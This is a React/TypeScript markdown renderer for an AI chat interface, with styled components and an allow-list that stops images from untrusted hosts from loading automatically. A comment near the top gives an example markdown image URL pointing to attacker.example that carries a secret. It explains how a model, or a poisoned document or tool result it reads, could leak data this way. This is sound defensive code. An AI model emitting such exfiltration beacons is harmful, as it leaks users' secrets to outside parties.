import ReactMarkdown from 'react-markdown'
import remarkGfm from 'remark-gfm'
import remarkMath from 'remark-math'
import rehypeKatex from 'rehype-katex'
import 'katex/dist/katex.min.css'
import { CodeBlock } from './CodeBlock'
import { openExternal } from '../../api/backend'
import type { Components } from 'react-markdown'

interface Props {
  content: string
}

// Assistant output can embed images via markdown `![](url)`. Auto-loading an
// arbitrary remote URL turns the renderer into a data-exfil beacon — a model
// (or a poisoned doc/tool-result it summarizes) emits
// `![](https://attacker.example/track?d=<secret>)` and the webview fires the GET
// on render, no script needed. So only auto-load from hosts we already trust
// (the same set the CSP img-src pins); anything else becomes a click-to-open
// link instead of a silent fetch. Belt-and-suspenders with the pinned CSP.
function isTrustedImageSrc(src: string): boolean {
  if (src.startsWith('data:image/')) return true
  if (src.startsWith('blob:')) return true
  let u: URL
  try {
    u = new URL(src)
  } catch {
    return false
  }
  if (u.protocol !== 'https:' && u.protocol !== 'http:') return false
  const h = u.hostname.toLowerCase()
  if (h === 'localhost' || h === '127.0.0.1') return true // local engine previews
  if (h === 'lrrhheztdytyfpizvuup.supabase.co') return true // LU cloud storage
  if (h === 'civitai.com' || h.endsWith('.civitai.com')) return true
  if (h.endsWith('.githubusercontent.com')) return true
  return false
}

const components: Components = {
  code({ className, children, ...props }) {
    const match = /language-(\w+)/.exec(className || '')
    const isBlock = match || (typeof children === 'string' && children.includes('\n'))

    if (isBlock) {
      return <CodeBlock code={String(children).replace(/\n$/, '')} language={match?.[1]} />
    }

    return (
      <code className="bg-gray-200 dark:bg-white/10 px-1.5 py-0.5 rounded text-gray-800 dark:text-gray-200 text-sm font-mono" {...props}>
        {children}
      </code>
    )
  },
  p({ children }) {
    return <p className="mb-3 leading-relaxed">{children}</p>
  },
  h1({ children }) {
    return <h1 className="text-xl font-bold mb-3 text-gray-900 dark:text-white">{children}</h1>
  },
  h2({ children }) {
    return <h2 className="text-lg font-bold mb-2 text-gray-900 dark:text-white">{children}</h2>
  },
  h3({ children }) {
    return <h3 className="text-base font-semibold mb-2 text-gray-900 dark:text-white">{children}</h3>
  },
  ul({ children }) {
    return <ul className="list-disc list-inside mb-3 space-y-1">{children}</ul>
  },
  ol({ children }) {
    return <ol className="list-decimal list-inside mb-3 space-y-1">{children}</ol>
  },
  blockquote({ children }) {
    return (
      <blockquote className="border-l-2 border-gray-300 dark:border-white/20 pl-4 my-3 text-gray-500 dark:text-gray-400 italic">
        {children}
      </blockquote>
    )
  },
  table({ children }) {
    return (
      <div className="overflow-x-auto my-3">
        <table className="w-full border-collapse border border-gray-200 dark:border-white/10 text-sm">{children}</table>
      </div>
    )
  },
  th({ children }) {
    return <th className="border border-gray-200 dark:border-white/10 px-3 py-2 bg-gray-100 dark:bg-white/5 text-left font-semibold">{children}</th>
  },
  td({ children }) {
    return <td className="border border-gray-200 dark:border-white/10 px-3 py-2">{children}</td>
  },
  a({ href, children }) {
    return (
      <button
        onClick={(e) => { e.preventDefault(); if (href) openExternal(href) }}
        className="text-blue-600 dark:text-blue-400 hover:underline cursor-pointer inline"
      >
        {children}
      </button>
    )
  },
  img({ src, alt }) {
    const s = typeof src === 'string' ? src : ''
    if (s && isTrustedImageSrc(s)) {
      return <img src={s} alt={alt ?? ''} loading="lazy" className="max-w-full rounded-md my-2" />
    }
    // Untrusted host — do not silently fetch. Offer an explicit click instead.
    return (
      <button
        onClick={(e) => { e.preventDefault(); if (s) openExternal(s) }}
        className="text-blue-600 dark:text-blue-400 hover:underline cursor-pointer inline"
        title={s}
      >
        🖼 {alt || 'image'} (click to open)
      </button>
    )
  },
}

export function MarkdownRenderer({ content }: Props) {
  return (
    <div className="markdown-content text-gray-800 dark:text-gray-200">
      <ReactMarkdown remarkPlugins={[remarkGfm, remarkMath]} rehypePlugins={[rehypeKatex]} components={components}>
        {content}
      </ReactMarkdown>
    </div>
  )
}
